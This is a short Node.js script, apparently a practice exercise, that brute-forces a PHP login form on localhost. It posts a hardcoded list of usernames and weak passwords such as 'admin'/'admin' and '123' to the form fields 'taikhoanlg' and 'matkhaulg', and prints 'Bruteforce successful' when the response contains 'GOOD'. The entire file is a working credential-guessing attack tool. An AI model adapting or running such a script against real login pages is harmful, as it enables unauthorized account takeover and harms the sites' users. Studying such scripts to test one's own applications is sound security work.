// var axios = require('axios')
// var FormData = require('form-data');

var axios = require('axios');
var FormData = require('form-data');

let globalState = false
const payloadArr = [
  // { user: 'admin', pass: '123' },
  { user: 'admin', pass: '456' },
  { user: 'admin', pass: '221' },
  { user: 'admin', pass: '102' },
  { user: 'admin', pass: 'admin' },
  { user: 'phuoc', pass: '123' },
  { user: 'dinh', pass: '123' },
  { user: 'doan', pass: '123' },
  { user: 'dhphuoc', pass: '123' },
  { user: 'tran', pass: '123' },
  { user: 'noname', pass: '123' },
]

const PostData = async (data, obj) => {
  var config = {
    method: 'post',
    url: 'http://localhost:8080/app/tai-khoan/xu-ly.php',
    headers: {
      ...data.getHeaders()
    },
    data: data
  };

  axios(config)
    .then(function (response) {
      if (JSON.stringify(response.data).includes('GOOD')) {
        console.log('===========Bruteforce successful with account', obj)
        globalState = true
      };
    })
    .catch(function (error) {
      console.log(error);
    });


}

payloadArr.map(async (obj, ind) => {
  var data = new FormData();
  data.append('taikhoanlg', obj.user);
  data.append('matkhaulg', obj.pass);
  await PostData(data, obj)
})
// if (!globalState) console.log('Can not find account')

